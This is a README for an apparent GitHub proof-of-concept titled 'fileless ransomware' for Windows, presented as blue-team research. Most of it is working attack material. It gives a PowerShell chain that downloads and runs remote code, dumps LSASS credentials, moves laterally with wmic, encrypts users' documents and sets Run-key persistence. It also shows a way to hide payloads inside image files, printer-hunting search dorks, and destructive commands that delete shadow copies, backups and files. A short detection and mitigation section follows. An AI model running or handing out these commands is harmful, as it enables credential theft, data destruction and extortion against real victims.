
# NSFW-Ransomware: Fileless Ransomware Simulation & Detection Research (PoC)

> **Warning**  
> This project is **strictly for educational, authorized research, and penetration testing in isolated lab environments**.  
> **Never deploy or test on production or unauthorized systems.  
> The authors assume NO liability for misuse.**

---

![Screenshot 2025-06-10 021151](https://github.com/user-attachments/assets/0a7b0119-2b11-49f1-93af-4fae2e6517bc)

---

## Table of Contents

- [About](#about)
- [Features](#features)
- [Technical Overview](#technical-overview)
- [Getting Started](#getting-started)
  - [Prerequisites](#prerequisites)
  - [Build Instructions](#build-instructions)
- [Simulated Attack Chain (PowerShell)](#simulated-attack-chain-powershell)
- [Reconnaissance and LOLBins](#reconnaissance-and-lolbins)
  - [Google Dork Examples](#google-dork-examples)
  - [Living Off the Land Binaries (LOLBins)](#living-off-the-land-binaries-lolbins)
- [Advanced Techniques](#advanced-techniques)
  - [Fileless Dropper Embedding](#fileless-dropper-embedding)
  - [Reflective DLL Injection](#reflective-dll-injection)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Destructive LOLBin Payloads](#destructive-lolbin-payloads)
- [Detection & Mitigation](#detection--mitigation)
- [Legal Disclaimer](#legal-disclaimer)
- [References & Further Reading](#references--further-reading)

---

## About

**NSFW-Ransomware** is a proof-of-concept (PoC) project that simulates advanced fileless ransomware and command-and-control (C2) techniques on Windows 10/11. It demonstrates how trusted Windows binaries can be abused for stealthy, hard-to-detect attacks.

### Primary Objectives

- Enable cybersecurity professionals and students to study fileless ransomware behaviors.
- Support blue team training, threat hunting, and detection engineering.
- Demonstrate abuse of built-in Windows binaries for stealth operations.

---

## Features

- **Fileless execution:** Simulates ransomware using PowerShell, LOLBins, and in-memory payloads.
- **Privilege escalation & credential access:** Demonstrates exploitation without custom binaries on disk.
- **Lateral movement & impact:** Simulates spreading and destructive actions using native tools only.
- **Detection bypass:** Designed to evade traditional endpoint protection by avoiding disk writes.
- **Detection research:** Provides blue teams with realistic attack scenarios for defensive testing.

---

## Technical Overview

This project simulates end-to-end fileless ransomware attack chains:

- **Initial Access:** Download and execute payloads in memory via LOLBins (e.g., PowerShell, rundll32.exe).
- **Privilege Escalation:** Exploits such as Print Spooler or HiveNightmare.
- **Credential Access:** Dumps credentials from memory (e.g., LSASS).
- **Lateral Movement:** Uses Windows network protocols for spreading.
- **Impact:** Encrypts or wipes files and disables recovery mechanisms, all filelessly.

> **Note:** All techniques are provided exclusively for blue team research and detection engineering.

---

## Getting Started

### Prerequisites

- Windows 10/11 (test in isolated, virtualized environments)
- PowerShell 5+
- Administrative privileges for certain simulations
- [7-Zip](https://www.7-zip.org/) (for extraction tasks)

### Build Instructions

> *Instructions to build or run code components should be placed here if applicable. If the PoC is script-based, provide clear execution steps.*

---

## Simulated Attack Chain (PowerShell)

A staged simulation using only built-in Windows tools:

```powershell
# Initial Access: Load dropper in-memory (no files written to disk)
IEX(New-Object Net.WebClient).DownloadString("http://malicious.local/dropper.ps1")

# Decode and load in-memory payload
$bytes = [System.Convert]::FromBase64String("[Base64Payload]")
[System.Reflection.Assembly]::Load($bytes)

# Privilege Escalation (Example)
Start-Process powershell -Args "-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1" -Verb RunAs

# Credential Access
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Lateral Movement
wmic /node:targetPC process call create "powershell.exe -File \\share\payload.ps1"

# File Encryption Example
$files = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
foreach ($file in $files) {
  $data = Get-Content $file.FullName -Raw
  $aes = New-Object System.Security.Cryptography.AesManaged
  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
  $aes.IV = New-Object byte[] 16
  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
}

# Persistence (Fileless via registry)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
```

---

## Reconnaissance and LOLBins

### Google Dork Examples

Use search engines (SHODAN, FOFA) to find potentially vulnerable services:

```
inurl:"/hp/device/this.LCDispatcher"
intitle:"Printer Status"
intitle:"Web Image Monitor"
inurl:"/printer/main.html"
intitle:"Web Jetadmin"
inurl:"/printers/"
intitle:"Konica Minolta"
intitle:"PaperCut MF"
```

### Living Off the Land Binaries (LOLBins)

Abuse trusted Windows binaries for stealthy, fileless attacks:

```cmd
rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry
```

Attackers may use `rundll32.exe`, `regsvr32.exe`, `powershell.exe`, and others to execute payloads in-memory from network shares or encoded scripts.

---

## Advanced Techniques

### Fileless Dropper Embedding

**Goal:** Hide payloads inside benign files (e.g., images), then extract and execute fully in memory.

1. **Embed Payload:**
    ```bash
    copy /b nsfw.jpg + payload.7z nsfw.jpg
    ```
2. **Extract & Decode:**
    ```cmd
    certutil -decode nsfw.jpg dropper.7z
    7z x dropper.7z -oC:\Users\Public\
    ```

### Reflective DLL Injection

Load a malicious DLL directly into memory, evading disk forensics.

```cmd
rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
```

---

## MITRE ATT&CK Mapping

| Phase                | Technique                             | ID               | Description                               |
|----------------------|---------------------------------------|------------------|-------------------------------------------|
| Initial Access       | Valid Accounts / Drive-by Compromise  | T1078, T1189     | Compromising print interfaces             |
| Execution            | DLL Side-Loading / LOLBins            | T1218, T1055.001 | Running DLLs reflectively                 |
| Privilege Escalation | Print Spooler Exploits / Hive ACL     | T1068, T1003.002 | SYSTEM access, SAM hash extraction        |
| Defense Evasion      | Fileless Execution / Obfuscated Files | T1027, T1202     | Encoded payloads via certutil, mshta, etc |
| Credential Access    | LSASS Dumping / SAM Hive Access       | T1003            | Credential dumping                        |
| Lateral Movement     | SMB/Net Share Enumeration             | T1021.002        | Spread via printer shares                 |
| Impact               | Data Destruction / Encryption         | T1485, T1486     | Fileless wiperware via DLL payloads       |

---

## Destructive LOLBin Payloads

Demonstrate ransomware/wiper activity using only native binaries:

- **cipher.exe** — Wipe free space:  
  `cipher /w:C:\`
- **vssadmin.exe** — Delete shadow copies:  
  `vssadmin delete shadows /all /quiet`
- **wbadmin.exe** — Remove backups:  
  `wbadmin delete systemstatebackup -keepVersions:0`
- **bcdedit.exe** — Disable recovery:  
  `bcdedit /set {default} recoveryenabled No`
- **fsutil.exe** — Force dirty volume:  
  `fsutil dirty set C:`
- **wmic.exe** — Mass delete files:  
  `wmic process call create "cmd.exe /c del /f /s /q C:\Users\*.docx"`
- **forfiles.exe** — Timed wipe:  
  `forfiles /p C:\ /s /d -2 /c "cmd /c del /q @file"`
- **schtasks.exe** — Scheduled wipe:  
  `schtasks /create /tn "Wipe" /tr "cmd /c del /f /q C:\*.xls" /sc once /st 23:59`
- **reg.exe** — Registry destruction:  
  `reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f`
- **certutil.exe** — Decode and detonate:  
  `certutil -decode payload.b64 wipe.exe && wipe.exe`

---

## Detection & Mitigation

### Detection

- **Sysmon + Sigma Rules:**
  - Monitor for LOLBins (e.g., `rundll32.exe`, `regsvr32.exe`, `certutil.exe`) executing unexpected DLLs/scripts.
  - Watch for unusual use of PowerShell and encoded/obfuscated commands.
  - Track unauthorized access or deletion of shadow volumes.
- **SIEM Correlation (ELK/Splunk):**
  - Alert on execution from network shares or suspicious parent/child process chains.
  - Detect encoded PowerShell or CMD commands.
- **EDR/XDR Solutions:**
  - Use behavioral detections for in-memory execution and reflective DLL injection.

### Mitigation

- **Disable unnecessary services:**
    ```cmd
    Stop-Service -Name Spooler -Force
    Set-Service -Name Spooler -StartupType Disabled
    ```
- **Patch vulnerabilities:** Apply security updates for Windows components (especially Print Spooler, Hive ACL, etc.).
- **Restrict LOLBins:** Use AppLocker or WDAC to limit the use of scripting engines and LOLBins.
- **Network segmentation:** Restrict access to administrative shares and sensitive network locations.
- **Regular backups:** Maintain offline and immutable backups.

---

## Legal Disclaimer

> All code, documentation, and techniques in this repository are provided for educational and authorized security research only.  
> **Any unauthorized use, distribution, or deployment is strictly prohibited.**  
> You are solely responsible for ensuring all actions are legal in your jurisdiction.  
> **The authors assume NO liability for misuse.**

---

## References & Further Reading

- [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
- [LOLGEN – Generate LOLBin Chains](https://lolgen.hdks.org/)
- [Detecting SeriousSam (CVE-2021-36934)](https://medium.com/@mvelazco/detecting-serioussam-cve-2021-36934-with-splunk-855dcbb10076)
- [DLL Injection Primer](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
- [Print Spooler Exploit Chain](https://itm4n.github.io/printnightmare-not-over/)
- [Fileless Malware – Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)
- [PrintSpoofer (Original)](https://github.com/itm4n/PrintSpoofer/tree/master)
- [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)
- [MITRE ATT&CK T1055](https://attack.mitre.org/techniques/T1055/001/)
- [HiveNightmare Demo](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5)

---

**Stay safe, research responsibly, and always act within ethical and legal boundaries.**

